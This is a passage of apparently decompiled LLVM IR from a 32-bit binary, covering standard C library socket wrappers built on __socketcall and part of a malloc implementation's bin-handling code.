dec_label_pc_804bd8a:                             ; preds = %dec_label_pc_804bad4, %dec_label_pc_804bacd, %dec_label_pc_804ba89, %entry, %dec_label_pc_804bd60, %dec_label_pc_804bc22, %dec_label_pc_804bb7c, %dec_label_pc_804bd85
  store i32 %v0_804ba63, i32* @ebx, align 4
  store i32 %v0_804ba62, i32* @esi, align 4
  store i32 %v0_804ba61, i32* @edi, align 4
  store i32 %v0_804ba60, i32* @ebp, align 4
  %v0_804bd91 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804bd91

; uselistorder directives
  uselistorder i32 %v2_804bbc4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804bb49, { 1, 0, 2 }
  uselistorder i32 %v1_804bb42, { 1, 0 }
  uselistorder i32 %v1_804bb2f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804baf8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804bae1, { 1, 0 }
  uselistorder i32 %v2_804bac1, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804bac1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804ba73, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804bd8a, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804bd60, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804baf4, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bdaf = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bdb6 = call i32 @__socketcall(i32 5, i32 %v2_804bdaf)
  ret i32 %v2_804bdb6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bddb = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bde2 = call i32 @__socketcall(i32 2, i32 %v2_804bddb)
  ret i32 %v2_804bde2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804be07 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804be0e = call i32 @__socketcall(i32 3, i32 %v2_804be07)
  ret i32 %v2_804be0e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804be2b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804be32 = call i32 @__socketcall(i32 4, i32 %v2_804be2b)
  ret i32 %v2_804be32

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804be5f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804be66 = call i32 @__socketcall(i32 10, i32 %v2_804be5f)
  ret i32 %v2_804be66

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804be93 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804be9a = call i32 @__socketcall(i32 9, i32 %v2_804be93)
  ret i32 %v2_804be9a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804bed7 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804bede = call i32 @__socketcall(i32 11, i32 %v2_804bed7)
  ret i32 %v2_804bede

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804bf13 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804bf1a = call i32 @__socketcall(i32 14, i32 %v2_804bf13)
  ret i32 %v2_804bf1a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bf3f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bf46 = call i32 @__socketcall(i32 1, i32 %v2_804bf3f)
  ret i32 %v2_804bf46

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 8, 7, 2, 3, 6, 1, 5, 4 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804bf50 = load i32, i32* @eax, align 4
  %v6_804bf63 = icmp ugt i32 %v0_804bf50, 16777215
  br i1 %v6_804bf63, label %dec_label_pc_804bf74, label %dec_label_pc_804bf65

dec_label_pc_804bf65:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804bf50, 256
  %v2_804bf52 = udiv i32 %v0_804bf50, 256
  %v2_804bf65 = call i32 @llvm.ctlz.i32(i32 %v2_804bf52, i1 true)
  %v3_804bf65 = xor i32 %v2_804bf65, 31
  %v5_804bf65 = select i1 %tmp, i32 95, i32 %v3_804bf65
  %v1_804bf68 = add nuw nsw i32 %v5_804bf65, 6
  store i32 %v1_804bf68, i32* @ecx, align 4
  %v2_804bf6b = urem i32 %v1_804bf68, 32
  %v4_804bf6b = icmp eq i32 %v2_804bf6b, 0
  br i1 %v4_804bf6b, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804bf65
  %v5_804bf6b = lshr i32 %v0_804bf50, %v2_804bf6b
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804bf65, %bb
  %v0_804bf6d = phi i32 [ %v0_804bf50, %dec_label_pc_804bf65 ], [ %v5_804bf6b, %bb ]
  %v1_804bf6d = urem i32 %v0_804bf6d, 4
  %v2_804bf70 = mul nuw nsw i32 %v5_804bf65, 4
  %v3_804bf70 = or i32 %v1_804bf6d, 32
  %v4_804bf70 = add nuw nsw i32 %v3_804bf70, %v2_804bf70
  br label %dec_label_pc_804bf74

dec_label_pc_804bf74:                             ; preds = %entry, %bb4
  %v0_804bf75 = phi i32 [ 95, %entry ], [ %v4_804bf70, %bb4 ]
  ret i32 %v0_804bf75

; uselistorder directives
  uselistorder i32 %v2_804bf6b, { 1, 0 }
  uselistorder i32 %v0_804bf50, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804bf74, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bf76 = load i32, i32* @ebp, align 4
  %v0_804bf77 = load i32, i32* @edi, align 4
  %v0_804bf78 = load i32, i32* @esi, align 4
  %v0_804bf79 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf79, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804bf8b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bf8b, i32* @eax, align 4
  store i32 %v2_804bf8b, i32* %stack_var_-92, align 4
  %v2_804bf90 = call i32 @__pthread_return_void(i32 %v2_804bf8b, i32 134535499)
  store i32 %v2_804bf90, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053610.341 to i32), i32* %stack_var_-92, align 4
  %v1_804bf9c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053610.341 to i32))
  store i32 %v1_804bf9c, i32* %eax.global-to-local, align 4
  %v0_804bfa4 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804bfa4, -32
  br i1 %tmp, label %dec_label_pc_804bfbb, label %dec_label_pc_804bfa9

dec_label_pc_804bfa9:                             ; preds = %entry
  %v0_804bfa9 = load i32, i32* %stack_var_-92, align 4
  %v1_804bfa9 = call i32 @__errno_location(i32 %v0_804bfa9)
  store i32 %v1_804bfa9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804bfb0 = inttoptr i32 %v1_804bfa9 to i32*
  store i32 12, i32* %v1_804bfb0, align 4
  br label %dec_label_pc_804c70e

dec_label_pc_804bfbb:                             ; preds = %entry
  %v1_804bfbb = add i32 %v0_804bfa4, 11
  %tmp136 = icmp ult i32 %v1_804bfbb, 16
  br i1 %tmp136, label %dec_label_pc_804bfd2, label %dec_label_pc_804bfcb

dec_label_pc_804bfcb:                             ; preds = %dec_label_pc_804bfbb
  %v1_804bfcb = and i32 %v1_804bfbb, -8
  br label %dec_label_pc_804bfd2

dec_label_pc_804bfd2:                             ; preds = %dec_label_pc_804bfbb, %dec_label_pc_804bfcb
  %storemerge133 = phi i32 [ %v1_804bfcb, %dec_label_pc_804bfcb ], [ %v1_804bfbb, %dec_label_pc_804bfbb ]
  %v1_804c372 = phi i32 [ %v1_804bfcb, %dec_label_pc_804bfcb ], [ 16, %dec_label_pc_804bfbb ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_804bfd2 = load i8, i8* @global_var_8055e40.342, align 1
  %v1_804bfd2 = sext i8 %v0_804bfd2 to i32
  store i32 %v1_804bfd2, i32* @ebx, align 4
  %v3_804bfd8 = urem i8 %v0_804bfd2, 2
  %v4_804bfd8 = icmp eq i8 %v3_804bfd8, 0
  %v1_804bfdb = icmp eq i1 %v4_804bfd8, false
  br i1 %v1_804bfdb, label %dec_label_pc_804bffa, label %dec_label_pc_804bfdd

dec_label_pc_804bfdd:                             ; preds = %dec_label_pc_804bfd2
  %v2_804bfdd = icmp eq i8 %v0_804bfd2, 0
  %v1_804bfdf = icmp eq i1 %v2_804bfdd, false
  br i1 %v1_804bfdf, label %dec_label_pc_804c2dd, label %dec_label_pc_804bfe5

dec_label_pc_804bfe5:                             ; preds = %dec_label_pc_804bfdd
  store i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32* %stack_var_-92, align 4
  %v2_804bfed = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055e40.342 to i32*))
  store i32 %v2_804bfed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c2dd

dec_label_pc_804bffa:                             ; preds = %dec_label_pc_804bfd2
  %v11_804bffa = trunc i32 %v1_804c372 to i8
  %v8_804bffe = icmp ugt i8 %v11_804bffa, %v0_804bfd2
  br i1 %v8_804bffe, label %dec_label_pc_804c01b, label %dec_label_pc_804c000

dec_label_pc_804c000:                             ; preds = %dec_label_pc_804bffa
  %v2_804c004 = udiv i32 %v1_804c372, 2
  store i32 %v2_804c004, i32* %eax.global-to-local, align 4
  %v1_804c006 = add i32 %v2_804c004, ptrtoint (i8* @global_var_8055e40.342 to i32)
  store i32 %v1_804c006, i32* @ecx, align 4
  %v1_804c00c = add i32 %v2_804c004, add (i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32 -4)
  %v2_804c00c = inttoptr i32 %v1_804c00c to i32*
  %v3_804c00c = load i32, i32* %v2_804c00c, align 4
  store i32 %v3_804c00c, i32* @edx, align 4
  %v1_804c00f = icmp eq i32 %v3_804c00c, 0
  br i1 %v1_804c00f, label %dec_label_pc_804c01b, label %dec_label_pc_804c013

dec_label_pc_804c013:                             ; preds = %dec_label_pc_804c000
  %v1_804c013 = add i32 %v3_804c00c, 8
  %v2_804c013 = inttoptr i32 %v1_804c013 to i32*
  %v3_804c013 = load i32, i32* %v2_804c013, align 4
  store i32 %v3_804c013, i32* %eax.global-to-local, align 4
  store i32 %v3_804c013, i32* %v2_804c00c, align 4
  br label %dec_label_pc_804c054

dec_label_pc_804c01b:                             ; preds = %dec_label_pc_804c000, %dec_label_pc_804bffa
  %v8_804c01b = icmp ult i32 %v1_804c372, 255
  %v6_804c023 = icmp ugt i32 %v1_804c372, 255
  store i32 %v1_804c372, i32* @eax, align 4
  br i1 %v6_804c023, label %dec_label_pc_804c05c, label %dec_label_pc_804c025

dec_label_pc_804c025:                             ; preds = %dec_label_pc_804c01b
  %v2_804c029 = udiv i32 %v1_804c372, 8
  store i32 %v2_804c029, i32* %eax.global-to-local, align 4
  %v1_804c02c = mul nuw i32 %v2_804c029, 8
  %v2_804c02c = add i32 %v1_804c02c, ptrtoint (i32* @global_var_8055e6c.343 to i32)
  store i32 %v2_804c02c, i32* @ecx, align 4
  %v1_804c037 = add i32 %v1_804c02c, add (i32 ptrtoint (i32* @global_var_8055e6c.343 to i32), i32 12)
  %v2_804c037 = inttoptr i32 %v1_804c037 to i32*
  %v3_804c037 = load i32, i32* %v2_804c037, align 4
  store i32 %v3_804c037, i32* @edx, align 4
  %v12_804c03a = icmp eq i32 %v3_804c037, %v2_804c02c
  br i1 %v12_804c03a, label %dec_label_pc_804c158.preheader, label %dec_label_pc_804c042

dec_label_pc_804c042:                             ; preds = %dec_label_pc_804c025
  store i32 %v1_804c372, i32* %ebx.global-to-local, align 4
  %v1_804c046 = add i32 %v3_804c037, 12
  %v2_804c046 = inttoptr i32 %v1_804c046 to i32*
  %v3_804c046 = load i32, i32* %v2_804c046, align 4
  store i32 %v3_804c046, i32* %eax.global-to-local, align 4
  %v2_804c049 = or i32 %v1_804c372, 4
  %v3_804c049 = add i32 %v3_804c037, %v2_804c049
  %v4_804c049 = inttoptr i32 %v3_804c049 to i32*
  %v5_804c049 = load i32, i32* %v4_804c049, align 4
  %v6_804c049 = or i32 %v5_804c049, 1
  store i32 %v6_804c049, i32* %v4_804c049, align 4
  %v0_804c04e = load i32, i32* %eax.global-to-local, align 4
  %v1_804c04e = load i32, i32* @ecx, align 4
  %v2_804c04e = add i32 %v1_804c04e, 12
  %v3_804c04e = inttoptr i32 %v2_804c04e to i32*
  store i32 %v0_804c04e, i32* %v3_804c04e, align 4
  %v0_804c051 = load i32, i32* @ecx, align 4
  %v1_804c051 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c051 = add i32 %v1_804c051, 8
  %v3_804c051 = inttoptr i32 %v2_804c051 to i32*
  store i32 %v0_804c051, i32* %v3_804c051, align 4
  br label %dec_label_pc_804c054

dec_label_pc_804c054:                             ; preds = %dec_label_pc_804c013, %dec_label_pc_804c042
  %v0_804c054 = load i32, i32* @edx, align 4
  %v1_804c054 = add i32 %v0_804c054, 8
  store i32 %v1_804c054, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c05c:                             ; preds = %dec_label_pc_804c01b
  %v0_804c060 = call i32 @__malloc_largebin_index()
  store i32 %v0_804c060, i32* %eax.global-to-local, align 4
  %v3_804c065 = and i8 %v0_804bfd2, 2
  %v4_804c065 = icmp eq i8 %v3_804c065, 0
  br i1 %v4_804c065, label %dec_label_pc_804c158.preheader, label %dec_label_pc_804c072

dec_label_pc_804c072:                             ; preds = %dec_label_pc_804c05c
  store i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32* %stack_var_-92, align 4
  %v2_804c07a = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055e40.342 to i32*))
  store i32 %v2_804c07a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c158.preheader

dec_label_pc_804c158.preheader:                   ; preds = %dec_label_pc_804c072, %dec_label_pc_804c025, %dec_label_pc_804c05c
  %stack_var_-40.0.ph = phi i32 [ %v2_804c029, %dec_label_pc_804c025 ], [ %v0_804c060, %dec_label_pc_804c072 ], [ %v0_804c060, %dec_label_pc_804c05c ]
  %v1_804c0ae = add i32 %v1_804c372, 16
  %v0_804c158109 = load i32, i32* @global_var_8055e80.346, align 128
  store i32 %v0_804c158109, i32* @ebp, align 4
  %v9_804c15e115 = icmp eq i32 %v0_804c158109, 134569588
  %v1_804c164117 = icmp eq i1 %v9_804c15e115, false
  br i1 %v1_804c164117, label %dec_label_pc_804c087, label %dec_label_pc_804c16a

dec_label_pc_804c087:                             ; preds = %dec_label_pc_804c158.preheader, %bb82
  %v0_804c158118 = phi i32 [ %v0_804c158, %bb82 ], [ %v0_804c158109, %dec_label_pc_804c158.preheader ]
  %v1_804c087 = add i32 %v0_804c158118, 4
  %v2_804c087 = inttoptr i32 %v1_804c087 to i32*
  %v3_804c087 = load i32, i32* %v2_804c087, align 4
  %v1_804c08a = add i32 %v0_804c158118, 12
  %v2_804c08a = inttoptr i32 %v1_804c08a to i32*
  %v3_804c08a = load i32, i32* %v2_804c08a, align 4
  store i32 %v3_804c08a, i32* @edx, align 4
  %v1_804c08d = and i32 %v3_804c087, -4
  store i32 %v1_804c08d, i32* @edi, align 4
  br i1 %v6_804c023, label %dec_label_pc_804c0b9, label %dec_label_pc_804c09a

dec_label_pc_804c09a:                             ; preds = %dec_label_pc_804c087
  %v9_804c09a = icmp eq i32 %v3_804c08a, 134569588
  %v1_804c0a0 = icmp eq i1 %v9_804c09a, false
  br i1 %v1_804c0a0, label %dec_label_pc_804c0b9, label %dec_label_pc_804c0a2

dec_label_pc_804c0a2:                             ; preds = %dec_label_pc_804c09a
  %v1_804c0a2 = load i32, i32* @global_var_8055e70.344, align 16
  %v12_804c0a2 = icmp eq i32 %v0_804c158118, %v1_804c0a2
  %v1_804c0a8 = icmp eq i1 %v12_804c0a2, false
  br i1 %v1_804c0a8, label %dec_label_pc_804c0b9, label %dec_label_pc_804c0aa

dec_label_pc_804c0aa:                             ; preds = %dec_label_pc_804c0a2
  store i32 %v1_804c0ae, i32* %eax.global-to-local, align 4
  %v6_804c0b3 = icmp ugt i32 %v1_804c08d, %v1_804c0ae
  br i1 %v6_804c0b3, label %dec_label_pc_804c698, label %dec_label_pc_804c0b9

dec_label_pc_804c0b9:                             ; preds = %dec_label_pc_804c0aa, %dec_label_pc_804c0a2, %dec_label_pc_804c09a, %dec_label_pc_804c087
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804c08a, i32* @global_var_8055e80.346, align 4
  %v2_804c0c1 = add i32 %v3_804c08a, 8
  %v3_804c0c1 = inttoptr i32 %v2_804c0c1 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v3_804c0c1, align 4
  %v0_804c0c4 = load i32, i32* @edi, align 4
  %v15_804c0c4 = icmp eq i32 %v0_804c0c4, %v1_804c372
  br i1 %v15_804c0c4, label %dec_label_pc_804c6d9, label %dec_label_pc_804c0ce

dec_label_pc_804c0ce:                             ; preds = %dec_label_pc_804c0b9
  %v6_804c0d4 = icmp ugt i32 %v0_804c0c4, 255
  br i1 %v6_804c0d4, label %dec_label_pc_804c0e7, label %dec_label_pc_804c0d6

dec_label_pc_804c0d6:                             ; preds = %dec_label_pc_804c0ce
  %v2_804c0d8 = udiv i32 %v0_804c0c4, 8
  store i32 %v2_804c0d8, i32* %esi.global-to-local, align 4
  %v1_804c0db = mul nuw i32 %v2_804c0d8, 8
  %v2_804c0db = add i32 %v1_804c0db, 134569580
  store i32 %v2_804c0db, i32* @ebx, align 4
  %v1_804c0e2 = add i32 %v1_804c0db, 134569588
  %v2_804c0e2 = inttoptr i32 %v1_804c0e2 to i32*
  %v3_804c0e2 = load i32, i32* %v2_804c0e2, align 4
  store i32 %v3_804c0e2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c130

dec_label_pc_804c0e7:                             ; preds = %dec_label_pc_804c0ce
  store i32 %v0_804c0c4, i32* @eax, align 4
  %v0_804c0e9 = call i32 @__malloc_largebin_index()
  store i32 %v0_804c0e9, i32* %esi.global-to-local, align 4
  %v1_804c0f0 = mul i32 %v0_804c0e9, 8
  %v2_804c0f0 = add i32 %v1_804c0f0, ptrtoint (i32* @global_var_8055e6c.343 to i32)
  store i32 %v2_804c0f0, i32* %eax.global-to-local, align 4
  %v1_804c0f7 = add i32 %v1_804c0f0, add (i32 ptrtoint (i32* @global_var_8055e6c.343 to i32), i32 8)
  %v2_804c0f7 = inttoptr i32 %v1_804c0f7 to i32*
  %v3_804c0f7 = load i32, i32* %v2_804c0f7, align 4
  store i32 %v3_804c0f7, i32* %edx.global-to-local, align 4
  %v12_804c0fa = icmp eq i32 %v3_804c0f7, %v2_804c0f0
  store i32 %v3_804c0f7, i32* @ebx, align 4
  br i1 %v12_804c0fa, label %dec_label_pc_804c130, label %dec_label_pc_804c104

dec_label_pc_804c104:                             ; preds = %dec_label_pc_804c0e7
  %v1_804c104 = add i32 %v1_804c0f0, add (i32 ptrtoint (i32* @global_var_8055e6c.343 to i32), i32 12)
  %v2_804c104 = inttoptr i32 %v1_804c104 to i32*
  %v3_804c104 = load i32, i32* %v2_804c104, align 4
  store i32 %v3_804c104, i32* @ebx, align 4
  %v0_804c107 = load i32, i32* @edi, align 4
  %v2_804c107 = add i32 %v3_804c104, 4
  %v3_804c107 = inttoptr i32 %v2_804c107 to i32*
  %v4_804c107 = load i32, i32* %v3_804c107, align 4
  %v10_804c107 = icmp ult i32 %v0_804c107, %v4_804c107
  %v1_804c10a = icmp eq i1 %v10_804c107, false
  br i1 %v1_804c10a, label %dec_label_pc_804c112, label %dec_label_pc_804c130

dec_label_pc_804c112:                             ; preds = %dec_label_pc_804c104
  %v1_804c114 = or i32 %v0_804c107, 1
  store i32 %v1_804c114, i32* %eax.global-to-local, align 4
  store i32 %v3_804c0f7, i32* %ebx.global-to-local, align 4
  %v2_804c128101 = add i32 %v3_804c0f7, 4
  %v3_804c128102 = inttoptr i32 %v2_804c128101 to i32*
  %v4_804c128103 = load i32, i32* %v3_804c128102, align 4
  %v10_804c128105 = icmp ult i32 %v1_804c114, %v4_804c128103
  br i1 %v10_804c128105, label %dec_label_pc_804c119, label %dec_label_pc_804c12d

dec_label_pc_804c119:                             ; preds = %dec_label_pc_804c112, %dec_label_pc_804c119
  %v0_804c12d106 = phi i32 [ %v3_804c11d, %dec_label_pc_804c119 ], [ %v3_804c0f7, %dec_label_pc_804c112 ]
  store i32 %v0_804c12d106, i32* %ecx.global-to-local, align 4
  %v1_804c11d = add i32 %v0_804c12d106, 8
  %v2_804c11d = inttoptr i32 %v1_804c11d to i32*
  %v3_804c11d = load i32, i32* %v2_804c11d, align 4
  store i32 %v3_804c11d, i32* %ecx.global-to-local, align 4
  store i32 %v3_804c11d, i32* %ebx.global-to-local, align 4
  %v2_804c128 = add i32 %v3_804c11d, 4
  %v3_804c128 = inttoptr i32 %v2_804c128 to i32*
  %v4_804c128 = load i32, i32* %v3_804c128, align 4
  %v10_804c128 = icmp ult i32 %v1_804c114, %v4_804c128
  br i1 %v10_804c128, label %dec_label_pc_804c119, label %dec_label_pc_804c12d

dec_label_pc_804c12d:                             ; preds = %dec_label_pc_804c119, %dec_label_pc_804c112
  %v0_804c12d.lcssa = phi i32 [ %v3_804c0f7, %dec_label_pc_804c112 ], [ %v3_804c11d, %dec_label_pc_804c119 ]
  %v1_804c12d = add i32 %v0_804c12d.lcssa, 12
  %v2_804c12d = inttoptr i32 %v1_804c12d to i32*
  %v3_804c12d = load i32, i32* %v2_804c12d, align 4
  store i32 %v3_804c12d, i32* @ebx, align 4
  br label %dec_label_pc_804c130

dec_label_pc_804c130:                             ; preds = %dec_label_pc_804c0d6, %dec_label_pc_804c104, %dec_label_pc_804c0e7, %dec_label_pc_804c12d
  %v0_804c130 = phi i32 [ %v0_804c0e9, %dec_label_pc_804c0e7 ], [ %v0_804c0e9, %dec_label_pc_804c12d ], [ %v0_804c0e9, %dec_label_pc_804c104 ], [ %v2_804c0d8, %dec_label_pc_804c0d6 ]
  %stack_var_-64.1 = phi i32 [ %v3_804c0f7, %dec_label_pc_804c0e7 ], [ %v0_804c12d.lcssa, %dec_label_pc_804c12d ], [ %v2_804c0f0, %dec_label_pc_804c104 ], [ %v3_804c0e2, %dec_label_pc_804c0d6 ]
  %v1_804c132 = urem i32 %v0_804c130, 32
  %v2_804c132 = icmp eq i32 %v1_804c132, 0
  store i32 %v1_804c132, i32* %esi.global-to-local, align 4
  store i32 %v1_804c132, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804c13c = sdiv i32 %v0_804c130, 32
  store i32 %v2_804c13c, i32* %edx.global-to-local, align 4
  br i1 %v2_804c132, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_804c130
  %v5_804c13f = shl i32 1, %v1_804c132
  store i32 %v5_804c13f, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_804c130, %bb
  %v5_804c141 = phi i32 [ 1, %dec_label_pc_804c130 ], [ %v5_804c13f, %bb ]
  %v1_804c141 = mul nsw i32 %v2_804c13c, 4
  %v2_804c141 = add i32 %v1_804c141, ptrtoint (i32* @global_var_8056174.347 to i32)
  %v3_804c141 = inttoptr i32 %v2_804c141 to i32*
  %v4_804c141 = load i32, i32* %v3_804c141, align 4
  %v6_804c141 = or i32 %v4_804c141, %v5_804c141
  store i32 %v6_804c141, i32* %v3_804c141, align 4
  %v0_804c148 = load i32, i32* @ebx, align 4
  %v1_804c148 = load i32, i32* @ebp, align 4
  %v2_804c148 = add i32 %v1_804c148, 12
  %v3_804c148 = inttoptr i32 %v2_804c148 to i32*
  store i32 %v0_804c148, i32* %v3_804c148, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804c14f = load i32, i32* @ebp, align 4
  %v2_804c14f = add i32 %v1_804c14f, 8
  %v3_804c14f = inttoptr i32 %v2_804c14f to i32*
  store i32 %stack_var_-64.1, i32* %v3_804c14f, align 4
  %v0_804c152 = load i32, i32* @ebp, align 4
  %v1_804c152 = load i32, i32* @esi, align 4
  %v2_804c152 = add i32 %v1_804c152, 12
  %v3_804c152 = inttoptr i32 %v2_804c152 to i32*
  store i32 %v0_804c152, i32* %v3_804c152, align 4
  %v0_804c155 = load i32, i32* @ebp, align 4
  %v1_804c155 = load i32, i32* @ebx, align 4
  %v2_804c155 = add i32 %v1_804c155, 8
  %v3_804c155 = inttoptr i32 %v2_804c155 to i32*
  store i32 %v0_804c155, i32* %v3_804c155, align 4
  %v0_804c158 = load i32, i32* @global_var_8055e80.346, align 128
  store i32 %v0_804c158, i32* @ebp, align 4
  %v9_804c15e = icmp eq i32 %v0_804c158, 134569588
  %v1_804c164 = icmp eq i1 %v9_804c15e, false
  br i1 %v1_804c164, label %dec_label_pc_804c087, label %dec_label_pc_804c16a

dec_label_pc_804c16a:                             ; preds = %bb82, %dec_label_pc_804c158.preheader
  br i1 %v8_804c01b, label %dec_label_pc_804c1f8, label %dec_label_pc_804c178

dec_label_pc_804c178:                             ; preds = %dec_label_pc_804c16a
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804c17c = mul i32 %stack_var_-40.0.ph, 8
  %v2_804c17c = add i32 %v1_804c17c, ptrtoint (i32* @global_var_8055e6c.343 to i32)
  store i32 %v2_804c17c, i32* %edx.global-to-local, align 4
  %v1_804c183 = add i32 %v1_804c17c, add (i32 ptrtoint (i32* @global_var_8055e6c.343 to i32), i32 12)
  %v2_804c183 = inttoptr i32 %v1_804c183 to i32*
  %storemerge1.pre = load i32, i32* %v2_804c183, align 4
  br label %dec_label_pc_804c1f4

dec_label_pc_804c188:                             ; preds = %dec_label_pc_804c1f4
  %v1_804c188 = add i32 %v4_804c19f, 4
  %v2_804c188 = inttoptr i32 %v1_804c188 to i32*
  %v3_804c188 = load i32, i32* %v2_804c188, align 4
  store i32 %v3_804c188, i32* %ebx.global-to-local, align 4
  %v1_804c18b = add i32 %v4_804c19f, 12
  %v2_804c18b = inttoptr i32 %v1_804c18b to i32*
  %v3_804c18b = load i32, i32* %v2_804c18b, align 4
  store i32 %v3_804c18b, i32* @ecx, align 4
  %v1_804c18e = and i32 %v3_804c188, -4
  store i32 %v1_804c18e, i32* @ebx, align 4
  %v10_804c191 = icmp ult i32 %v1_804c18e, %v1_804c372
  br i1 %v10_804c191, label %dec_label_pc_804c1f4, label %dec_label_pc_804c197

dec_label_pc_804c197:                             ; preds = %dec_label_pc_804c188
  %v1_804c197 = add i32 %v4_804c19f, 8
  %v2_804c197 = inttoptr i32 %v1_804c197 to i32*
